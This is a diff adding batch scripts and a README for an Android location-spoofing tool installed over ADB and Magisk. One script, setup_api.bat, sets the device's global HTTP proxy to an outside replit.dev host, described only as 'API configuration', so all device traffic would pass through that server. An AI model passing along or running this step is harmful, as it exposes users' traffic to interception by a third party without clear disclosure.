@@ -1,0 +1,6 @@
+{
+  "adb_commands.bat": "@echo off\necho LocationSpoof Windows Tools\necho.\necho Installing module...\nadb push LocationSpoof_Module.zip /sdcard/\nadb shell am start -a android.intent.action.VIEW -d \"magisk://install?source=adb\"\necho.\necho Module installed! Reboot your device.\npause",
+  "check_device.bat": "@echo off\necho Checking device compatibility...\nadb shell getprop ro.product.model\nadb shell getprop ro.build.version.release\nadb shell su -c \"magisk -v\"\necho.\npause",
+  "setup_api.bat": "@echo off\nset API_URL=https://596207ef-f19a-4a30-ab59-fc565ae43740-00-3bx34fik1vey6.picard.replit.dev\necho Setting up API connection...\nadb shell settings put global http_proxy %API_URL%:5000\necho API configured to: %API_URL%\npause",
+  "README.txt": "LocationSpoof Windows Tools\n\nRequirements:\n- ADB (Android Debug Bridge) installed\n- USB Debugging enabled on device\n- Device connected via USB\n\nFiles:\n- adb_commands.bat: Install the module\n- check_device.bat: Check device compatibility  \n- setup_api.bat: Configure API connection\n\nUsage:\n1. Connect your Android device via USB\n2. Run check_device.bat to verify compatibility\n3. Run adb_commands.bat to install module\n4. Run setup_api.bat to configure connection\n\nAPI Endpoint: https://596207ef-f19a-4a30-ab59-fc565ae43740-00-3bx34fik1vey6.picard.replit.dev"
+}
